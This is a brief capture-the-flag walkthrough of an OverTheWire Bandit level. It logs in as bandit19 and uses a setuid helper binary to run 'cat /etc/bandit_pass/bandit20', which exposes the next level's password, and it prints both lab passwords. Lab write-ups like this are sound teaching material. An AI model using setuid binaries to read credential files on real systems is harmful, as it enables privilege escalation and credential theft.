The suid binary executes as bandit20, therefore we can exploit this to peek at bandit20’s password as bandit19. 


[$]-> ssh bandit19@bandit.labs.overthewire.org -p 2220

[$]-> IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

[$]-> ls

[$]-> ./bandit20-do

# Run a command as another user.

[$]-> ./bandit20-do id

[$]-> ./bandit20-do whoami

[$]-> ./bandit20-do cat /etc/bandit_pass/bandit20

The password for bandit20 is: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
